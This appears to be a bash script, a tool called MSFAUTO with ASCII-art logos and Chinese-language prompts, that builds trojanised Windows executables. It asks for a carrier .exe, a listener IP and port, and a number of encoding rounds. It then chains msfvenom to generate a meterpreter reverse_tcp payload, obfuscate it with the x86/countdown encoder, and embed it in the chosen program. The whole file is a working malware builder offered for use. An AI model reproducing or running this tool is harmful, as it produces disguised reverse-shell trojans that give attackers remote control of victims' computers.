#!/bin/bash

logo1=$'
.------..------..------..------..------..------..------.
|M.--. ||S.--. ||F.--. ||A.--. ||U.--. ||T.--. ||O.--. |
| (\\/) || :/\\: || :(): || (\\/) || (\\/) || :/\\: || :/\\: |
| :\\/ : || :\\/ : || () || :\\/: || : \\/ : ||  || : \\/ : |
| "--"M|| "--"S|| "--"F|| "--"A|| "--"U|| "--"T|| "--"O|
`------\'`------\'`------\'`------\'`------\'`------\'`------\'
'

logo2=$'
  __  __  _____ ______     _    _ _______ ____  
 |  \\/  |/ ____|  ____/\\  | |  | |__   __/ __ \\ 
 | \\  / | (___ | |__ /  \\ | |  | |  | | | |  | |
 | |\\/| |\\___ \\|  __/ /\\ \\| |  | |  | | | |  | |
 | |  | |____) | | / ____ \\ |__| |  | | | |__| |
 |_|  |_|_____/|_|/_/    \\_\\____/   |_|  \\____/ 
                                                
'

random_number=$((RANDOM%2))

if [ "$random_number" -eq 0 ]
then
  echo "$logo1"
else
  echo "$logo2"
fi


echo "				Version:F_2.01Q
 "
																					                                    			  echo "请输入载体名(无需输入后缀,本程序将自动处理)"
read -p "载体名: " template
template_base=${template%%.*}
template=${template_base}".exe"

echo "为输出程序命名(无需输入后缀,本程序将自动处理)"
read -p "成品名: " output
output_base=${output%%.*}
output=${output_base}".exe"

if [ "$template" != "$template_base" ] || [ "$output" != "$output_base" ]; then
  echo "以上名若有误,本程序将自动纠正"
fi

read -p "监听端IP: " lhost
read -p "监听者端口: " lport
read -p "使用countdown编码次数: " countdown

echo "LHOST为: $lhost"
echo "LPORT为: $lport"

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw | \
msfvenom -a x86 --platform windows -e x86/countdown -i $countdown -f raw - | \
msfvenom -a x86 --platform windows -x $template -f exe -o $output
